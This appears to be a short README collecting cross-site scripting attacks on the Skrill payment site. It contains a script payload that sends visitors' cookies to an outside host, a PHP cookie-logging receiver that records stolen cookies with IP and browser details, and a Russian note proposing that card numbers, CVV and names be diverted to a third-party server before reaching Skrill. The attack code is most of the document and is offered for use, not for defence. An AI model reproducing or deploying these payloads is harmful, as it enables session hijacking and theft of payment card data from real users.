xss_skrill
==========

*xss work: 9,10,11,12,13,14,15,16,17.10.2014*

**Demo:** http://atastycookie.me/skrill/


Write you example of XSS and we post it here :)

0) Был предложен вариант перерисовки новой кнопки отправки введенных данных сначала на сторонний сервер(карта, номер, cvv, фио и вся информация), а потом ттолько на SKRILL

1) `"><script>alert()</script>` 

2) `"><script language= "JavaScript">document.location="http://atastycookie.me/skrill/xss.php?cookie=" + document.cookie;document.location="http://atastycookie.me"</script>`

    <?php 
    
    function GetIP() 
    { 
    	if (getenv("HTTP_CLIENT_IP") && strcasecmp(getenv("HTTP_CLIENT_IP"), "unknown")) 
    		$ip = getenv("HTTP_CLIENT_IP"); 
    	else if (getenv("HTTP_X_FORWARDED_FOR") && strcasecmp(getenv("HTTP_X_FORWARDED_FOR"), "unknown")) 
    		$ip = getenv("HTTP_X_FORWARDED_FOR"); 
    	else if (getenv("REMOTE_ADDR") && strcasecmp(getenv("REMOTE_ADDR"), "unknown")) 
    		$ip = getenv("REMOTE_ADDR"); 
    	else if (isset($_SERVER['REMOTE_ADDR']) && $_SERVER['REMOTE_ADDR'] && strcasecmp($_SERVER['REMOTE_ADDR'], "unknown")) 
    		$ip = $_SERVER['REMOTE_ADDR']; 
    	else 
    		$ip = "unknown"; 
    	return($ip); 
    } 
    
    function logData() 
    { 
    	$ipLog="log.txt"; 
    	$cookie = $_SERVER['QUERY_STRING']; 
    	$register_globals = (bool) ini_get('register_gobals'); 
    	if ($register_globals) $ip = getenv('REMOTE_ADDR'); 
    	else $ip = GetIP(); 
    
    	$rem_port = $_SERVER['REMOTE_PORT']; 
    	$user_agent = $_SERVER['HTTP_USER_AGENT']; 
    	$rqst_method = $_SERVER['METHOD']; 
    	$rem_host = $_SERVER['REMOTE_HOST']; 
    	$referer = $_SERVER['HTTP_REFERER']; 
    	$date=date ("l dS of F Y h:i:s A"); 
    	$log=fopen("$ipLog", "a+"); 
    
    	if (preg_match("/\bhtm\b/i", $ipLog) || preg_match("/\bhtml\b/i", $ipLog)) 
    		fputs($log, "IP: $ip | PORT: $rem_port | HOST: $rem_host | Agent: $user_agent | METHOD: $rqst_method | REF: $referer | DATE{ : } $date | COOKIE:  $cookie <br>"); 
    	else 
    		fputs($log, "IP: $ip | PORT: $rem_port | HOST: $rem_host |  Agent: $user_agent | METHOD: $rqst_method | REF: $referer |  DATE: $date | COOKIE:  $cookie \n\n"); 
    	fclose($log); 
    } 
    
    logData(); 
    
    ?>
